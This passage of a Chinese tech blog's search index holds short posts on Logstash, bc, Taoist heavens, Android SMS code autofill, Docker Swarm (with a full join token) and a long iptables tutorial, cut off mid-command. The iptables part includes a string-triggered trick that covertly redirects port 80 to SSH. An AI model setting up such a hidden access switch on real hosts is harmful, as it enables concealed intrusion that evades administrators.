折叠问题我们留到下篇再说。\n\n至此我们说完了清除浮动的四种方式，似乎我们彻底弄明白了如何清除浮动。其实不然，在下一篇我会介绍你所不知道的【清除浮动】。是不是在想：啊！还有不知道的呢？。。哈哈，也许这就是CSS的博大精深吧。\n\n参考文章：\n\n http://www.quirksmode.org/css/clearing.html\n http://nicolasgallagher.com/micro-clearfix-hack/\n http://www.yuiblog.com/blog/2010/09/27/clearfix-reloaded-overflowhidden-demystified/\n\n题外话：\n\n最近在看书的时候学到一句话和大家分享\n\n  \" I hear and I forget , I see and I remember , I do and I understand\"\n\n还看啥呢？动手吧！O(∩_∩)O\n\n","tags":null},{"location":"//blog.pytool.com/Post/Elastic/Logstash/2016-10-04 logstash自定义timestamp ","title":"logstash自定义timestamp","text":"I used date filter to solve it, like:\ndate {\nmatch =  [\"timestamp\", \"dd/MMM/yyyy:HH:mm:ss Z\"]\ntarget =  \"@timestamp\"\n}","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/系统监控/2016-10-04 linux-dash","title":"linux-dash","text":"https://github.com/afaqurk/linux-dash","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 bc","title":"Linux命令 bc","text":"bc\r\n进制转换\r\nibase=10\r\nobase=16\r\n41\r\n29","tags":null},{"location":"//blog.pytool.com/Life/2016-03-01 道家36重天","title":"道家36重天","text":"中国神仙排行榜（超详细）\n中国道教神谱百度百科\n缠论第一高手佛道儒三界十大高手排名，黑幕你根本想不到嘉渔热线生活网\n盘古、女娲、西王母、元始天尊这些大神到底是怎么诞生的？\n猪八戒沙和尚他们实际有多厉害? - 知乎\n阎罗（阎罗：道教人物）百度百科\nhttp://mt.sohu.com/20160927/n469296807.shtml\n六御百度百科\n北极四圣百度百科\n\n创始元灵_百度百科\n胎生者，从胞胎而出生也。即人畜龙仙之类是也。\n卵生者，从壳而出生也。即鱼鸟龟蛇之类是也。\n湿生者，从湿处而受生也。即含蠢蠕动之虫类是也。\n化生者，无而忽有也。即夜叉罗刹恶鬼是也。\n\n道，天地，三清，四御，五方五老\n\n北极紫微大帝麾下四圣（天蓬、天猷、翊圣、玄武）之\n元始天尊(盘古)\n因为老君被元始天尊联手灵宝天尊击败。\n后来玉帝(昊天) 拜入元始天尊门下，成为三界之主（执政）。老君只得排名退让\n\n36 变 72 化。（道教中两样都会的只有两人：元始，灵宝）\n\n创始元灵(他有4个徒弟,鸿钧老祖、混鲲祖师、女娲娘娘和陆压道君）\n1、鸿钧老祖收三清 收有三大弟子：太上老君（道德天尊33重天），元始天尊三清之首35重天，通天教主 （灵宝天尊34重天）\n三清：上清，玉清，太清 。三清又代表三个时期，简单来说就是过去，现在，将来，就是三才。玉清 元始天尊 ， 上清 灵宝天尊 ， 太清 道德天尊\n三清之下是玉帝，玉帝之下是四帝，四帝之首，是东极青华帝君。此人就是赫赫有名的九头狮子精“”的主人！九头狮子精超级厉害。在书中，九头狮子精是取经路上唯一一个秒杀孙悟空的妖魔。可九灵元圣根本不打斗，他已经达到了法力通玄的地步。既然如此厉害，那他的主人实力也可见一斑。\n\n四御为道教天界尊神中辅佐“玉帝”的四位尊神，所以又称“四辅”。他们的全称是：中天紫微北极大帝、南极长生大帝、勾陈上宫天皇大帝、承天效法后土皇地祇。加玉皇与救苦天尊则称六御，\n\n道家三十六重天，分为六界。\n\n最高境界是\n第六界的大罗天。\n鸿钧老祖\n 第五界便是三清天，分别是玉清天、上清天、太清天；\n33重天，太清境大赤天（太上老君道场） 三十三重离恨天\n元始天尊(盘古)  三清之首35重天\n通天教主       灵宝天尊34重天 灵宝天尊，也称灵宝道君，\n太上老君       道德天尊33重天\n第四界乃是四梵天，依次是无上常融天、玉隆腾胜天、龙变梵度天、平育贾奕天；\n 第三界四重天，分别是皓庭霄度天、渊通元洞天、翰宠妙成天、秀乐禁上天。\n第二界十八重天，依次是无越衡天、太极蒙翳天、赤明和阳天、玄明恭华天、耀明宗飘天、竺落皇笳天、虚明堂曜天、观明端靖天、玄明恭庆天、太焕极瑶天、元载孔升天、太安皇崖天、显定极风天、始黄孝芒天、太黄翁重天、无思江由天、上揲阮乐天、无极昙誓天。\n 第一界六重天，分别是太皇黄曾天、太明玉完天、清明何童天、玄胎平育天、元明文举天、七曜摩夷天。","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用 短信验证码自动填写","title":"自动填写短信验证码","text":"这个也不是什么新东西，目前很多app都有这个功能，最近有几个小伙伴问我是怎么实现的，索性写一篇博客来为大家解答。\n实现思路很简单：\n1、在需要输入验证码的Activity代码注册监听短信的广播\n2、拦截短信，获取其中的验证码\n3、回写到EditText\n    private SmsReciver smsReciver = new SmsReciver();  \n    / 收到短信Action /  \n    String ACTIONSMSRECIVER = \"android.provider.Telephony.SMSRECEIVED\";  \n/*\n 注册广播接受者监听短信验证码自动回写  可在onCreate()中进行注册;\n /  \nprivate void registSmsReciver() {  \n    IntentFilter filter = new IntentFilter();  \n    filter.addAction(ACTIONSMS_RECIVER);  \n    // 设置优先级 不然监听不到短信   \n    filter.setPriority(1000);  \n    registerReceiver(smsReciver, filter);  \n    }  \n\n      /*\n   短信广播接受者 用户监听短信，自动填写验证码\n   /  \n      private class SmsReciver extends BroadcastReceiver {  \n\n    @Override  \n    public void onReceive(Context context, Intent intent) {  \n        Object[] objs = (Object[]) intent.getExtras().get(\"pdus\");  \n          for (Object obj : objs) {  \n              yte[] pdu = (byte[]) obj;  \n             SmsMessage sms = SmsMessage.createFromPdu(pdu);  \n             // 短信的内容  \n             String message = sms.getMessageBody();  \n             Log.d(\"log\", \"message     \" + message);  \n            // 短息的手机号，如果你们公司发送验证码的号码是固定的这里可以进行一个号码的校验  \n             String from = sms.getOriginatingAddress();  \n             Log.d(\"log\", \"from     \" + from);  \n             analysisVerify(message);  \n\n        }  \n     }  \n\n}  \n\n /*\n 解析短信并且回写  这里解析的是纯数字的短信，如果小伙伴的验证码包含字母的话，可用正则替换\n   @param message\n  */  \nprivate void analysisVerify(String message) {  \n    char[] msgs = message.toCharArray();  \n     StringBuffer sb = new StringBuffer();  \n    for (int i = 0; i \u003c msgs.length; i++) {  \n        if ('0' \u003c= msgs[i] \u0026\u0026 msgs[i] \u003c= '9') {  \n                        sb.append(msgs[i]);  \n        }  \n    }  \n\n    mEtVerifyCode.setText(sb.toString());  \n }  \n\n@Override  \nprotected void onDestroy() {  \n    super.onDestroy();  \n    // 取消短信广播注册  \n    if (smsReciver != null) {  \n        unregisterReceiver(smsReciver);  \n        smsReciver = null;  \n    }  \n}  \n可以看到代码逻辑比较简单，需要注意的有几点。我们这里用的代码注册广播，之所以不采取全局广播的形式原因有两天，在高版本的api，注册全局的短信监听会失效。而且就业务而言，我们监听短信只会在输入验证码的Activity里面才会用到，采用代码注册的形式，在当前Activity销毁的时候取消广播注册，更符合我们的预期，提高应用的性能。第二个需要注意的问题是优先级的问题\n\n    filter.setPriority(1000);  \n\n可以看到，我们这里把优先级设置成了最大。保证我们的应用能够尽可能的接受到短信。注意，我使用的是“尽可能”，也就是说我们不能保证短信自动填写一定能执行成功，有个小伙伴可能会问，我们不是把优先级设置成了最高了吗？为什么还不能保证了？ 原因其实很简单，你能把监听短信的优先级设置成最大，同样的，其他的应用也能把短信监听的优先级设置成最大。比如说，你的手机安装有360安全卫士，把你们公司的验证码视为垃圾短信拦截了，这个时候短信拦截就失效了。","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-01-02 Linux命令 Docker-swarm","title":"Linux命令 Docker swarm","text":"ElasticSearch cluster using Docker Swarm mode 1.12\n基本知识\ndocker swarm init --advertise-addr 192.168.99.100\n--advertise-addr vboxnet0  指定发布ip;绑定监听网卡\n--advertise-addr 参数用来标记当前管理节点发布出去后的网络地址，集群中的其他节点应该可以通过这个IP访问到管理节点\n\n（3）开放主机端口\n下面的端口必须是开放的：\nTCP端口2377，集群管理通信\nTCP和UDP端口7946，节点间通信\nTCP和UDP端口4789，overlay网络交互\nfirewall-cmd --permanent --add-port=7946/tcp\nfirewall-cmd --permanent --add-port=7946/udp\nfirewall-cmd --permanent --add-port=4789/udp\n swarm集群\ncreate dockerd:2376\ndocker-machine create -d generic --engine-registry-mirror=https://fl7aylpq.mirror.aliyuncs.com --generic-ip-address=139.129.234.31 --generic-ssh-user=root --generic-ssh-key=$HOME/.ssh/idrsa --generic-ssh-port 22 ubuntu\ndocker-machine create -d generic --engine-registry-mirror=https://amoq5ee6.mirror.aliyuncs.com --generic-ip-address=139.129.108.163  --generic-ssh-user=root --generic-ssh-key=$HOME/.ssh/idrsa --generic-ssh-port 22 aliyun\n    vi /etc/systemd/system/docker.service $ENGINEREGISTRYMIRROR\n    ExecStart=/usr/bin/docker daemon -H tcp://0.0.0.0:2376 -H unix:///var/run/docker.sock --storage-driver devicemapper --tlsverify --tlscacert /etc/docker/ca.pem --tlscert /etc/docker/server.pem --tlskey /etc/docker/server-key.pem --label provider=generic --registry-mirror https://amoq5ee6.mirror.aliyuncs.com\n\ndocker run -d --name mariadb -p 3306:3306 -v /var/lib/mysql:/var/lib/mysql -v /var/run/mysqld:/var/run/mysqld mariadb:5.5\ndocker-machine create -d virtualbox swmaster # This will be the master\ndocker-machine create -d virtualbox swnode\n\n  dockerd -D -g /var/lib/docker -H unix:// -H tcp://0.0.0.0:2376 --label provider=virtualbox --tlsverify --tlscacert=/var/lib/boot2docker/ca.pem --tlscert=/var/lib/boot2docker/server.pem --tlskey=/var/lib/boot2docker/server-key.pem -s aufs\n  docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --shim docker-containerd-shim --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --runtime docker-runc --debug\nactive\n  \u0026 docker-machine.exe env aliyun | Invoke-Expression\n  eval $(docker-machine env swmaster)\nswarm node:2377\n\n  一台机器只能创建一个swarm 通过 docker swarm init --advertise-addr vboxnet0绑定监听网卡\n  本机器失效后 docker swarm leave --froce 删除本节点\n  通过 docker node rm --force ubuntu 删除无效节点\n  所有manger节点失效后 集群失效\n  即使有manager 节点,当leader 节点swarm leave 之后 集群失效\n  leader 通过 docker node demote self 可以将控制转移\n正确的处理方式:\nmanager-  leader: docker node demote leader\nmanager-  leader: docker node rm --force leader\nleader-  work:  docker leave\n\n推荐做法:\n  保证manager的数量  3\n  确保 docker swarm join-token manager 在leader上执行\ndocker $(docker-machine config swmaster) swarm init --advertise-addr $(docker-machine ip swmaster)\n\ndocker swarm join-token manager\n\ndocker $(docker-machine config swnode) swarm join --token SWMTKN-1-26tk5t6vg1h9z4vq3z7e17z2wcvor2kt5ws6433qoqli0xh0os-ccy5d06jj4w3mj6s4twe4vs9m $(docker-machine ip swmaster)\n\ndocker node rm swnode --force #删除swarm work\nswarm service\ndocker run 替换成 docker service create\n滚动更新我们worker, 每次更新2个副本容器, 延迟5s\ndocker service update worker --update-parallelism 2 --update-delay 5s --image localhost:5000/dockercoinsworker:v0.01\ndocker service update worker --image localhost:5000/dockercoinsworker:v0.1 回滚\ndocker service create --replicas 5 --name helloworld alpine ping google.com\ndocker service create alpine ping 8.8.8.8\ndocker service list\ndocker logs d6155498b874\ndocker service ps d6155498b874\nwatch docker service list\ndocker service ls -q | xargs docker service rm #删除服务\nELK日志平台\nElasticSearch 用来存储和索引日志.\nLogstash 用来接收, 发送, 过滤, 分隔日志.\nKibana 用来搜索, 展示, 分析日志的UI\n\n swarm集群\ncreate dockerd:2376\ndocker-machine create -d generic --engine-registry-mirror=https://fl7aylpq.mirror.aliyuncs.com --generic-ip-address=139.129.234.31 --generic-ssh-user=root --generic-ssh-key=$HOME/.ssh/idrsa --generic-ssh-port 22 ubuntu\ndocker-machine create -d generic --engine-registry-mirror=https://amoq5ee6.mirror.aliyuncs.com --generic-ip-address=139.129.108.163  --generic-ssh-user=root --generic-ssh-key=$HOME/.ssh/idrsa --generic-ssh-port 22 aliyun\n    vi /etc/systemd/system/docker.service $ENGINEREGISTRYMIRROR\n    ExecStart=/usr/bin/docker daemon -H tcp://0.0.0.0:2376 -H unix:///var/run/docker.sock --storage-driver devicemapper --tlsverify --tlscacert /etc/docker/ca.pem --tlscert /etc/docker/server.pem --tlskey /etc/docker/server-key.pem --label provider=generic --registry-mirror https://amoq5ee6.mirror.aliyuncs.com\n\ndocker run -d --name mariadb -p 3306:3306 -v /var/lib/mysql:/var/lib/mysql -v /var/run/mysqld:/var/run/mysqld mariadb:5.5\ndocker-machine create -d virtualbox swmaster # This will be the master\ndocker-machine create -d virtualbox swnode\n\n  dockerd -D -g /var/lib/docker -H unix:// -H tcp://0.0.0.0:2376 --label provider=virtualbox --tlsverify --tlscacert=/var/lib/boot2docker/ca.pem --tlscert=/var/lib/boot2docker/server.pem --tlskey=/var/lib/boot2docker/server-key.pem -s aufs\n  docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock --shim docker-containerd-shim --metrics-interval=0 --start-timeout 2m --state-dir /var/run/docker/libcontainerd/containerd --runtime docker-runc --debug\nactive\n  \u0026 docker-machine.exe env aliyun | Invoke-Expression\n  eval $(docker-machine env swmaster)\nswarm node:2377\n\n  一台机器只能创建一个swarm 通过 docker swarm init --advertise-addr vboxnet0绑定监听网卡\n  本机器失效后 docker swarm leave --froce 删除本节点\n  通过 docker node rm --force ubuntu 删除无效节点\n  所有manger节点失效后 集群失效\n  即使有manager 节点,当leader 节点swarm leave 之后 集群失效\n  leader 通过 docker node demote self 可以将控制转移\n正确的处理方式:\nmanager-  leader: docker node demote leader\nmanager-  leader: docker node rm --force leader\nleader-  work:  docker leave\n\n推荐做法:\n  保证manager的数量  3\n  确保 docker swarm join-token manager 在leader上执行\ndocker $(docker-machine config swmaster) swarm init --advertise-addr $(docker-machine ip swmaster)\n\ndocker swarm join-token manager\n\ndocker $(docker-machine config swnode) swarm join --token SWMTKN-1-26tk5t6vg1h9z4vq3z7e17z2wcvor2kt5ws6433qoqli0xh0os-ccy5d06jj4w3mj6s4twe4vs9m $(docker-machine ip swmaster)\n\ndocker node rm swnode --force #删除swarm work\nswarm service\ndocker run 替换成 docker service create\n滚动更新我们worker, 每次更新2个副本容器, 延迟5s\ndocker service update worker --update-parallelism 2 --update-delay 5s --image localhost:5000/dockercoinsworker:v0.01\ndocker service update worker --image localhost:5000/dockercoinsworker:v0.1 回滚\ndocker service create --replicas 5 --name helloworld alpine ping google.com\ndocker service create alpine ping 8.8.8.8\ndocker service list\ndocker logs d6155498b874\ndocker service ps d6155498b874\nwatch docker service list\ndocker service ls -q | xargs docker service rm #删除服务\nELK日志平台\nElasticSearch 用来存储和索引日志.\nLogstash 用来接收, 发送, 过滤, 分隔日志.\nKibana 用来搜索, 展示, 分析日志的UI","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 iptables","title":"Linux命令 Iptables","text":"---\n1. ipset\n使用 dnsmasq 和 ipset 的策略路由 | K.I.S.S\n\napt-get install ipset\nipset create banthis hash:net maxelem 1000000\niptables -I INPUT -m set --match-set banthis src -p tcp --destination-port 80 -j DROP\niptables -I INPUT -m set --match-set banthis src -p tcp --destination-port 443 -j DROP\n\n 2. nftables\n\n**Lesca技术宅\n**Iptables入门教程\nlinux下IPTABLES配置详解\niptables的基本语法格式\n超级详细的Iptables指南\niptables 详解及7层过滤\niptables防火墙原理详解\n洞悉linux下的Netfilter\u0026iptables：内核中的iptables小觑\n################################################################################\n/etc/rc.d/init.d/iptables save\nservice iptables save   # 将配置保存\nservice iptables restart\n\nsystemctl restart iptables.service #最后重启防火墙使配置生效\nsystemctl enable iptables.service #设置防火墙开机启动\n\n国家代码编制好的 IP 地址列表IPdeny \nAPNIC是管理亚太地区IP地址分配的机构\n################################################################################\nDOCKER 给运行中的容器添加映射端口\ndocker inspect -f '{{.NetworkSettings.IPAddress}}' mariadb\nDNAT主机30006 =  指定容器3306端口实现转发\n  iptables -t nat -A DOCKER ! -i docker0 -p tcp --dport 30006 -j DNAT --to-destination 192.168.0.2:3306\n\nfilter 容器端口 3306\n  iptables -A DOCKER -d 192.168.0.2/32 ! -i docker0 -o docker0 -p tcp --dport 3306 -j ACCEPT\n  iptables -t nat -A POSTROUTING -s 192.168.0.2/32 -d 192.168.0.2/32 -p tcp -m tcp --dport 3306 -j MASQUERADE\n端口转发跳板\n\n    单网卡通过 192.168.1.100:8081 访问 192.168.1.101:3306\n\n    iptables -t nat -A PREROUTING -d 192.168.1.100 -p tcp --dport 8081 -j DNAT --to-destination 192.168.1.101:3306\n    iptables -t nat -A PREROUTING -d 118.190.83.111 -p tcp --dport 22 -j DNAT --to-destination 10.30.216.58:22\n    iptables -t nat -A POSTROUTING -d 10.30.216.58 -p tcp --dport 22 -j SNAT --to 10.30.183.164\n\n 本机端口转发 8000 3306\niptables -t nat -A PREROUTING -p tcp --dport 8000 -j REDIRECT --to-ports 3306\niptables -t nat -D PREROUTING -p tcp --dport 8000 -j REDIRECT --to-ports 3306\n等价\niptables -t nat -A PREROUTING -p tcp -i eth1 --dport 8000 -j DNAT --to-destination :3306\niptables -t nat -A PREROUTING -p tcp -i eth1 --dport 8000 -j DNAT --to-destination 127.0.0.1:3306\niptables -A INPUT -i eth1 -p tcp --dport 8000 -m state --state NEW,ESTABLISHED -j ACCEPT\n iptables -A OUTPUT -o eth1 -p tcp --sport 8000 -m state --state ESTABLISHED -j ACCEPT\n################################################################################\nlinux  filter nat mangle raw\n-S,--line-numbers\nsudo iptables -t nat -nL --line-numbers\n删除INPUT链的第一条规则\niptables -D INPUT 1\n统计链中规则的包和流量计数,嘿嘿,看看哪些小子用的流量那么多,用tc限了他。\niptables -t nat -L -vn\n查看指定链规则\nsudo iptables -t nat --list-rules\n\niptables [ -t 表名] 命令选项 [链名] [条件匹配] [-j 目标动作或跳转]\n-t 表名：[Filter], NAT, Mangle, Raw 默认为Filter\n-p 协议 all,tcp, udp, icmp, udplite, icmpv6,esp, ah, sctp, mh\n-m 对规则进行匹配(match)说明,常常跟在被追加(-A)、插入(-I)、替换(-R)的链(chain)之后\n\n删除 nat表 PREROUTING 链\nsudo iptables -t nat -nL --line-numbers\nsudo iptables -t nat -D PREROUTING 2\n\n1.规则管理\niptables -A    添加一条新规则\niptables -I    插入一条新规则 -I 后面加一数字表示插入到哪行\niptables -D INPUT 1   删除一条新规则 -D 后面加一数字表示删除哪行\niptables -R INPUT 1   替换一条新规则 -R 后面加一数字表示替换哪行\n\n2.链管理\niptables -F    清空链中的所有规则\niptables -N    新建一个链\niptables -X    删除一个自定义链,删除之前要保证次链是空的,而且没有被引用\niptables -E    重命名链\n\n3.默认规则管理\n\niptables -P    设置默认规则\n\n4.查看\niptables -L    查看规则 –L 还有几个子选项如下\niptables -L -n 以数字的方式显示\niptables -L -v 显示详细信息\niptables -L -x 显示精确信息\niptables -L --line-numbers 显示行号\n\n 5.条件匹配\n! 用在接口名、协议名等前面,使规则的作用相反\n(1).基本匹配\n条件匹配也可以使用 ! 取反\n-s    源地址\n-d    目标地址\n-i    从哪个网络接口进入,比如 -i eth0\n-o    从哪个网络接口出去,比如 -o eth0\n-p    协议{tcp|udp|icmp}\n\n (2).扩展匹配 man iptables-extensions\n隐含扩展匹配\n-p tcp\n  --sport PORT[first:last] 源端口\n  --dport PORT[first:last] 目标端口\n  --tcp-flags mask comp: [mask为1的位必须匹配]\n    有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)\n    tcp的标志位,只检查mask指定的标志位,是逗号分隔的标志位列表：SYN ACK FIN RST URG PSH ALL NONE\n    comp：此表中出现的标志位必须为1,comp中没出现,而mask中出现的,必须为0\n    --tcp-flags SYN,FIN,ACK,RST    SYN      第一次握手 SYN=1,FIN=0,RST=0,ACK=0 等价于 --syn\n    --tcp-flags SYN,FIN,ACK,RST    SYN,ACK  第二次握手 SYN=1,FIN=0,RST=0,ACK=1\n    --tcp-flags SYN,FIN,ACK,RST    ACK      第三次握手 SYN=0,FIN=0,RST=0,ACK=1\n-p udp\n    --sport\n    --dport\n-p icmp:\n    --icmp-type：报文协议的类型\n    0:echo-replay回显应答（ping应答）\n    8:echo-request回显请求（ping请求）ping出去的是8\n\n    自己ping别人：出去的是8,回来的是0  8-  \u003c-0\n    别人ping自己：进来的是8,出去的是0  8- -0\n\n显示扩展匹配\n\n-m 对规则进行匹配(match)说明,常常跟在被追加(-A)、插入(-I)、替换(-R)的链(chain)之后\n\n-m multiport 离散多端口匹配扩展(最多使用15个）\n     [!] --ports port[,port|,port:port]...\n     [!] --source-ports,--sports port[,port|,port:port]...\n     [!] --destination-ports,--dports port[,port|,port:port]...\n     -m multiport --sports 53,1024:65535 would therefore match ports 53 and all from 1024 through 65535.\n\n-m iprange指定IP地址段（指定地址池），也可以取反“！”\n     --src-range\n     --dst-range\n\n-m connlimit:连接数限定\n    ！--connmilit-above n: 将单IP的并发设置为6；会误杀使用NAT上网的用户，可以根据实际情况增大该值；\n\n-m limit\n    --limit 3/minute   每三分种一次 RATE控制单位时间内的流量上限  --limit rate[/second|/minute|/hour|/day]\n    --limit-burst  5   只匹配5个数据包 一批可以同时涌进多少个请求  --limit-burst number\n    limit-burst是个初始值..匹配次数过了这个初始值，之后的就由limit xxx/s来控制了\n-m lenth 匹配数据包的长度\n    -m length --length 1139 \n    ping -c 1 -s 1111 192.168.33.78 向目标发送一个长度为 1111 的 ICMP 数据包（加上包头28，总长度实际为1139）\n-m string 限定用户访问的字符串\n    --algo:字符算法{bm|kmp} bm 后查法 优于 kmp算法\n    --string：匹配哪个字符串\n    -m string --algo bm --string \"passwd\"  匹配字符串\n\n-m recent\n    # 端口复用链\n    iptables -t nat -N SSH\n    # 端口复用规则\n    iptables -t nat  -A SSH -p tcp -j REDIRECT --to-port 22\n\n    # 开启开关\n    iptables -A INPUT -p tcp -m string --string 'coming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT\n    # 关闭开关\n    iptables -A INPUT -p tcp -m string --string 'leaving' --algo bm -m recent --name letmein --remove -j ACCEPT\n\n    # let's do it\n    iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN\n\n    开启复用，开启后本机到目标 80 端口的流量将转发至目标的 SSH，80 将无法再被本机访问：\n    echo threathuntercoming | socat - tcp:192.168.33.78:80\n\n-m mac --mac-source xx:xx:xx:xx:xx:xx 匹配源MAC地址为\n\n-m time --timestart 8:00 --timestop 12:00  表示从哪个时间到哪个时间段\n-m time --days    表示那天\n-m layer7 --l7proto qq   表示匹配腾讯qq的 当然也支持很多协议,这个默认是没有的,需要我们给内核打补丁并重新编译内核及iptables才可以使用\n-m conntrack：对下列连接通信与当前的包/连接进行匹配。 conntrack模块可以根据先前的连接来确定数据包之间的关系\n  -ctstate ESTABLISHED, RELATED：规则将应用到的连接状态。\n  在本例中，ESTABLISHED 连接代表能够看到两个方向数据包的连接，\n  而 RELATED 类型代表，数据包开启一个新连接，但是与现有连接相关联。\niptables -m conntrack --help conntrack模块会在以后的版本中取代state,state是简化版\n-m state --state   匹配状态的，结合ipconntrack追踪会话的状态，ip状态有四种\n        NEW：          新连接请求\n        ESTABLISHED：  已建立的连接\n        RELATED：      相关联的\n        INVALID：      非法连接\n    -m state --state NEW -j ACCEPT 状态为NEW的放行\n    -m state --state NEW,ESTABLISHED -j ACCEPT 状态为NEW、ESTABLISHED的都放行\n\nIPTABLES的几个状态\n这个模块在iptables下的使用叫做state,而在Netfilter机制中是以xtstate.ko文件存在。在TCP/IP规范中连接状态共划分为十二种,但在state模块的描述下却只有四种,分别是ESTABLISHED、NEW、RELATED及INVALID,这两个分类是两个不相干的定义。例如在TCP/IP标准描述下UDP及ICMP数据包是没有连接状态的,但在state模块的描述下,任何数据包都有连接状态。\n\nNEW          [新连接请求]\n当你在使用UDP、TCP、ICMP等协议时,发出的第一个包的状态就是“NEW”,NEW与协议无关\n首先我们知道,NEW与协议无关,其所指的是每一条连接中的第一个数据包,\n\nESTABLISHED  [已建立的连接]\n(1)与TCP数据包的关系：首先在防火墙主机上执行SSH Client,并且对网络上的SSH服务器提出服务请求,而这时送出的第一个数据包就是服务请求的数据包,如果这个数据包能够成功的穿越防火墙,那么接下来SSH Server与SSH Client之间的所有SSH数据包的状态都会是ESTABLISHED。\n\n(2)与UDP数据包的关系：假设我们在防火墙主机上用firefox应用程序来浏览网页（通过域名方式）,而浏览网页的动作需要DNS服务器的帮助才能完成,因此firefox会送出一个UDP数据包给DNS Server,以请求名称解析服务,如果这个数据包能够成功的穿越防火墙,那么接下来DNS Server与firefox之间的所有数据包的状态都会是ESTABLISHED。\n(3)与ICMP数据包的关系：假设我们在防火墙主机ping指令来检测网络上的其他主机时,ping指令所送出的第一个ICMP数据包如果能够成功的穿越防火墙,那么接下来刚才ping的那个主机与防火墙主机之间的所有ICMP数据包的状态都会是ESTABLISHED。\n由以上的解释可知,只要数据包能够成功的穿越防火墙,那么之后的所有数据包（包含反向的所有数据包）状态都会是ESTABLISHED。\n\nRELATED     [相关联的]\nRELATED状态的数据包是指被动产生的数据包。而且这个连接是不属于现在任何连接的。RELATED状态的数据包与协议无关,只要回应回来的数据包是因为本机送出一个数据包导致另一个连接的产生,而这一条新连接上的所有数据包都是属于RELATED状态的数据包。\n\nINVALID    [非法连接]\nINVALID状态是指状态不明的数据包,也就是不属于以上三种状态的封包。这类包一般会被视为恶意包而被丢弃。凡是属于INVALID状态的数据包都视为恶意的数据包,因此所有INVALID状态的数据包都应丢弃掉,匹配INVALID状态的数据包的方法如下：\niptables -A INPUT -p all -m state INVALID -j DROP\n我们应将INVALID状态的数据包放在第一条。\n\n 6.处理动作\n\n-j ACCEPT     允许\n-j REJECT     拒绝\n-j DROP       拒绝并提示信息\n-j SNAT       源地址转换\n-j DNAT       目标地址转换\n-j REDIRECT   重定向\n-j MASQUERAED  地址伪装\n-j LOG --log-prefix \"说明信息,自己随便定义\"      记录日志\n\n常用的处理动作：\n-j 参数用来指定要进行的处理动作,常用的处理动作包括：ACCEPT、REJECT、DROP、REDIRECT、MASQUERADE、LOG、DNAT、SNAT、MIRROR、QUEUE、RETURN、MARK。\nACCEPT 将数据包放行,进行完此处理动作后,将不再比对其它规则,直接跳往下一个规则链（natostrouting）。\nREJECT 拦阻该数据包,并传送数据包通知对方,可以传送的数据包有几个选择：ICMP port-unreachable、ICMP echo-reply 或是tcp-reset（这个数据包会要求对方关闭联机）,进行完此处理动作后,将不再比对其它规则,直接 中断过滤程序。 范例如下：\niptables -A FORWARD -p TCP --dport 22 -j REJECT --reject-with tcp-reset\nDROP 丢弃包不予处理,进行完此处理动作后,将不再比对其它规则,直接中断过滤程序。\nLOG 将封包相关讯息纪录在 /var/log 中,详细位置请查阅 /etc/syslog.conf 配置文件,进行完此处理动作后,将会继续比对其规则。例如：\niptables -A INPUT -p tcp -j LOG --log-prefix \"INPUT packets\"\n\nSNAT 改写封包来源 IP 为某特定 IP 或 IP 范围,可以指定 port 对应的范围,进行完此处理动作后,将直接跳往下一个规则（mangleostrouting）。范例如下：\n    --to-source ipaddr[-ipaddr]]\n    --random\n    --random-fully\n    --persistent\niptables -t nat -A POSTROUTING -p tcp-o eth0 -j SNAT --to-source 194.236.50.155-194.236.50.160:1024-32000\n\nMASQUERADE 改写数据包来源 IP为防火墙 NIC IP,可以指定 port 对应的范围,进行完此处理动作后,直接跳往下一个规则（mangleostrouting）。这个功能与 SNAT 略有不同,当进行 IP 伪装时,不需指定要伪装成哪个 IP,IP 会从网卡直接读取,当使用拨号连接时,IP 通常是由 ISP 公司的 DHCP 服务器指派的,这个时候 MASQUERADE 特别有用。算是snat中的一种特例，可以实现自动化的snat\n    --to-ports port[-port]\n    --random\niptables -t nat -A POSTROUTING -p TCP -j MASQUERADE --to-ports 1024-31000\niptables -t nat -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE\n修改源ip地址的目的一般都是为了让这个包能再回到自己这里，所以在iptables中，SNAT是在出口，也即POSTROUTING链发挥作用。\n\n修改目的ip地址的原因一般就是为了改变包发送的目的地，让包走出去，所以在iptables中，DNAT是在入口，也即PREROUTING链中发挥作用，以便让包进入FORWARD表。\nDNAT 改写封包目的地 IP 为某特定 IP 或 IP 范围,可以指定 port 对应的范围,进行完此处理动作后,将会直接跳往下一个规炼（filter:input 或 filter:forward）。范例如下：\n    --to-destination ipaddr[-ipaddr]]\n    --persistent\n    --random\niptables -t nat -A PREROUTING -p tcp -d 15.45.23.67 --dport 80 -j DNAT --to-destination 192.168.1.1-192.168.1.10:80-100\n每个流都会被随机分配一个要转发到的地址，但同一个流总是使用同一个地址\n\nREDIRECT 将包重新导向到另一个端口（PNAT）,进行完此处理动作后,将会继续比对其它规则。 这个功能可以用来实作通透式porxy 或用来保护 web 服务器。例如：DNAT的一种特殊形式,将网络包转发到本地host上（不管IP头部指定的目标地址是啥）[端口转发]\n    --to-ports port[-port]\n    --random\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080\n\nMIRROR 镜像数据包,也就是将来源 IP 与目的地 IP 对调后,将数据包送回,进行完此处理动作后,将会中断过滤程序。\n\n10. QUEUE 中断过滤程序,将数据包放入队列,交给其它程序处理。透过自行开发的处理程序,可以进行其它应用,例如：计算联机费.......等。\n    --queue-num value\n    --queue-balance value:value\n    --queue-bypass\n    --queue-cpu-fanout\n11. RETURN 结束在目前规则链中的过滤程序,返回主规则链继续过滤,如果把自订规则链看成是一个子程序,那么这个动作,就相当提早结束子程序并返回到主程序中。\nMARK 将数据包标上某个代号,以便提供作为后续过滤的条件判断依据,进行完此处理动作后,将会继续比对其它规则。范例如下：\niptables -t mangle 